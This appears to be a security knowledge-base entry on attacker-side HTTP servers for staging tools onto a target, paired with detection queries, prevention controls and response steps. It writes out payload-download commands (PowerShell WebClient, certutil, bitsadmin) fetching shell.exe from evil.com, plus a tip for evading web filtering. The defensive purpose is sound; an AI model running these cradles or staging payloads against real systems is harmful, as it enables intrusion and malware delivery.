notes: Quick attacker-side servers: `python3 -m http.server 8000`, `php -S 0.0.0.0:8000`, `ruby -run -e httpd . -p 8000`. For uploads use uploadserver or nginx PUT. The staple for ingress tool transfer.

recommended.note: Windows target pulls from this server.

name: Hosting - Quick HTTP Servers
description: Serve the current directory over HTTP so a target can download from you. Use whichever interpreter is installed; uploadserver also accepts uploads.

variations.label: Python 2
variations.description: Starts a Python 2 HTTP server for hosting files. Quick way to serve payloads and tools to the target machine.

variations.label: PHP
variations.description: Starts a PHP built-in web server for hosting files. Lightweight alternative to Python HTTP server when PHP is available.

variations.label: Ruby
variations.description: Starts a Ruby HTTP server for hosting files. One-liner file server when Ruby is installed on the attack machine.

variations.label: Python upload server
variations.description: Runs a Python-based tool or script for exploitation, enumeration, or post-exploitation activities.

variations.label: Python FTP server (upload-capable)
variations.description: Python FTP server (upload-capable). See the command syntax for exact parameters and flags.

defense.why_it_works: A quick attacker-side HTTP server (python -m http.server, php -S, Apache/nginx) hosts files for the target to download over HTTP - the most common staging method because outbound HTTP is nearly always allowed.
defense.prerequisites: An attacker host to run the server and the target able to reach it over the chosen HTTP port.
defense.impact: A staging point from which the target pulls tooling; pairs with any download method.
defense.detection: Outbound HTTP from the target to an unusual/external IP hosting files; the download tool's request and UA in proxy logs; new file on disk on the target side.
defense.artifacts: An outbound HTTP GET to the attacker's server; access-log entries on the attacker side; the fetched file on the target.
defense.splunk_spl:
index=proxy OR index=network (dest_port=8000 OR dest_port=8080)
| where match(uri_path, "\\.(exe|sh|ps1|dll|bin)$")
| table _time, src_ip, dest_ip, uri_path

index=linux sourcetype="linux:auditd" comm="wget" OR comm="curl"
| table _time, host, proctitle
defense.elastic_kql: event.category:network AND destination.port:(8000 OR 8080) AND network.direction:outbound
defense.sentinel_kql:
DeviceNetworkEvents
| where RemotePort in (8000, 8080, 8888) and RemoteIPType == "Public"
| where InitiatingProcessFileName in~ ("wget","curl","powershell.exe","certutil.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName, RemoteIP, RemotePort
| sort by Timestamp desc
// outbound GET to a python http.server hosting tools
defense.sigma_rules: net_download_from_python_http_server (fetch from an ad-hoc HTTP file server)
defense.prevention: [MITRE T1105 M1037 Filter Network Traffic] Use web content filtering to block risky file types (.exe) and whitelist domains (the module scenario shows GitHub/Dropbox/Drive blocked); [M1031 Network Intrusion Prevention] inspect and block transfers at IDS/IPS. Apply application control (WDAC/AppLocker) to block download cradles/LOLBins, and AV/EDR to catch known tooling.
defense.evasion: Serve over HTTPS on 443 from a domain that passes web filtering; the server itself is attacker-side so target-visible signal is just the download.
defense.misconfiguration: Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.
defense.vulnerable_config:
# Living-off-the-land file download methods (all built into Windows/Linux):
# PowerShell (often bypasses older AV):
(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\Temp\shell.exe')

# certutil (trusted Microsoft binary, often not blocked):
certutil -urlcache -split -f http://evil.com/payload.exe payload.exe

# bitsadmin (background transfer service):
bitsadmin /transfer myJob http://evil.com/shell.exe C:\Temp\shell.exe

# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.
defense.secure_config:
# Application allowlisting (most effective):
# Windows Defender Application Control (WDAC) or AppLocker
# Only signed, approved executables run
# Blocks dropping and running arbitrary payloads even via LOLBins

# PowerShell Constrained Language Mode + AMSI:
# GPO: PowerShell Execution Policy = AllSigned
# Blocks unsigned scripts; AMSI scans all scripts before execution

# Egress filtering - block outbound to unknown IPs:
# Web proxy with allowlist for legitimate update sources
# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)
# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'

# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process
# Defender ATP: 'Suspicious process using Certutil to download content'

validation.success_criteria: At least one behavioral detection fires within 60 seconds of attack execution
response_steps: Correlate alert with source host, user account, and timestamp
Review PowerShell Script Block / Module Logs, Web proxy logs, Linux Audit (auditd), Windows Security Event Log for surrounding context (5 min before/after)
Verify whether the activity matches known administrative baselines or change windows
If confirmed malicious, isolate the host and escalate to incident response

explain:
Serves the current directory over HTTP so a target can download from you:
  python3 -m http.server 8000   run Python's built-in web server on port 8000
Everything in the folder becomes downloadable at http://<your-ip>:8000/; php -S, ruby -run, and uploadserver are drop-in alternatives when python is missing.
